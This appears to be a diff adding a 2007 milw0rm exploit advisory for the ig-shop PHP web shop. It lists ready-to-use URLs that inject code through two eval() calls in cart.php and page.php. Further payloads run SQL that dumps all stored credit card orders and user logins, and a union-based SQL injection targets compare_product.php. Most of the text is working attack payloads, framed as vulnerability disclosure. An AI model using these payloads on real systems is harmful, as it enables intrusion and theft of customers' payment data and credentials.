@@ -1,0 +1,31 @@
+"If eval is the answer,  then you are asking the wrong question."
+--Unknowen
+
+ig-shop suffers from two eval's that can be controlled by an attacker:
+http://127.0.0.1/ig_shop/cart.php?action=;phpinfo();//
+./cart.php line 692:
+eval ("cart_$action();");
+
+http://127.0.0.1/ig_shop/page.php?action=;phpinfo();//
+./page.php line 336:
+eval ("page_$action();");
+
+Dumps all credit card numbers:
+http://127.0.0.1/ig_shop/cart.php?action=;$q=mysql_query(stripslashes($l));while($a=mysql_fetch_array($q)){print_r($a);}//&l=select%20*%20from%20orders
+Some of these variables can be decoded using the unserlize()  funciton.
+
+Dumps all logins:
+http://127.0.0.1/ig_shop/cart.php?action=;$q=mysql_query(stripslashes($l));while($a=mysql_fetch_array($q)){print_r($a);}//&l=select%20*%20from%20users
+
+
+sql injection works regardless of magic_quotes_gpc.
+http://127.0.0.1/ig_shop/compare_product.php?id=1%20union%20select%201
+./compare_product.php line 11:
+$qry_txt="select type_id from catalog_product where product_id=".$HTTP_GET_VARS[id];
+Should have used quote marks. 
+
+vendor's page:http://www.igeneric.co.uk/
+
+By Michael Brooks. 
+
+# milw0rm.com [2007-01-05]
